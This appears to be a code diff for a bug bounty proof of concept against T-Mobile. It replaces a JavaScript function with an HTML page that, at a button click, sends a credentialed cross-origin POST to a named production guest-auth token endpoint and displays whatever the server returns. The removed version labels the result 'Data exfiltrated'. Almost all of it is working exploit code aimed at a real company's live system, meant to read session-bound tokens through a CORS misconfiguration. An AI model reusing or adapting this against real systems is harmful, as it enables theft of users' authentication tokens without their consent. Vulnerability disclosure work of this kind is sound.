@@ -1,24 +1,52 @@
-// Verification script for your GitHub Pages console
-async function verifyCORS() {
-    const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens';
-    try {
-        const response = await fetch(target, {
-            method: 'POST',
-            credentials: 'include', // Crucial: This attempts to use the user's T-Mobile session
-            headers: { 'Content-Type': 'text/plain' },
-            body: '{}'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Bug Bounty PoC</title>
+</head>
+<body>
+
+    <h1>T-Mobile CORS Test</h1>
+    <button id="runBtn">Fire Fetch Request</button>
+    
+    <h3>Results:</h3>
+    <pre id="output" style="background: #eee; padding: 10px; border: 1px solid #ccc; min-height: 50px;">
+        Click the button to start...
+    </pre>
+
+    <script>
+        document.getElementById('runBtn').addEventListener('click', function() {
+            const output = document.getElementById('output');
+            output.innerText = "Requesting...";
+
+            const cacheBuster = '?v=' + Date.now();
+            const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;
+
+            fetch(target, {
+                method: 'POST',
+                mode: 'cors',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'text/plain',
+                    'Cache-Control': 'no-cache'
+                },
+                body: '{}' 
+            })
+            .then(response => {
+                console.log("Status:", response.status);
+                // Proof of the bug: check if headers exist
+                console.log("ACAO:", response.headers.get('Access-Control-Allow-Origin'));
+                return response.text(); 
+            })
+            .then(data => {
+                output.innerText = data || "Success! (But body was empty)";
+                console.log("Data:", data);
+            })
+            .catch(err => {
+                output.innerText = "Bypass Failed: " + err;
+                console.error("Error details:", err);
+            });
         });
+    </script>
 
-        // 1. Check if the server reflected your GitHub origin
-        console.log("ACAO Header:", response.headers.get('Access-Control-Allow-Origin'));
-        
-        // 2. Check if credentials (cookies) were accepted
-        console.log("ACAC Header:", response.headers.get('Access-Control-Allow-Credentials'));
-
-        const data = await response.json();
-        console.log("SUCCESS! Data exfiltrated:", data);
-        document.getElementById('output').innerText = "Vulnerability Confirmed: " + JSON.stringify(data, null, 2);
-    } catch (err) {
-        console.error("CORS Blocked the read:", err);
-    }
-}
+</body>
+</html>
